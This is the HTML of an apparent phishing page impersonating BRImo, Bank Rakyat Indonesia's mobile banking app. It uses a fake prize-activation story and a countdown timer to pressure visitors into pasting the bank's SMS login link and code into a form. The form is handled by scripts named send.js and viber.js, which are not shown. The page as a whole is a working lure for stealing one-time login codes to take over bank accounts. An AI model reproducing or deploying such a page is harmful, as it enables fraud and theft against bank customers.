
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verifikasi | BRImo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="../css/verify.css">
</head>
<body>
    <div class="container flex">
        <span class="alert" style="display:none;">
            <i class="fa-solid fa-circle-xmark"></i>
            <p>Invalid Requests</p>
        </span>
        <div class="bbox">
            <div class="box">
                <form id="formOtp" class="formOtp" onsubmit="sendSms(event);">
                    <div class="flex bimg">
                        <img class="iconsms" src="../img/sms.png" alt="icon" />
                    </div>
                    <div class="flex line">
                        <h1 class="tit blue">Cek SMS</h1>
                    </div>
                    <div class="wrpp">
                        <span class="flex blue" id="countdown">03 : 00</span>
                        <p class="desc">Link Aktivasi Hadiah telah kami kirim ke nomor Anda, Silakan salin pesan Link tersebut lalu tempel pada form dibawah ini.<br><br><b>Tempel SMS BRI (WAJIB)</b></p>
                        <div class="flex btarea">
                            <textarea autocomplete="off" rows="3" name="inpsms" id="inpsms" class="inpsms" placeholder="Contoh SMS https://brimo.bri.co.id/app/login?code=xxxx" required ></textarea>
                        </div>
                        <button disabled id="btnsubmit" type="submit">Konfirmasi</button>
                    </div>
                </form>
            </div>
            <p class="resend">Tidak terima SMS?</span> <span class="blue send">Kirim Ulang</span></p>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
    <script src="../js/viber.js"></script>
    <script src="../js/cd.js"></script>
    <script src="../js/valid.js"></script>
    <script src="../js/send.js"></script>
</body>
</html>
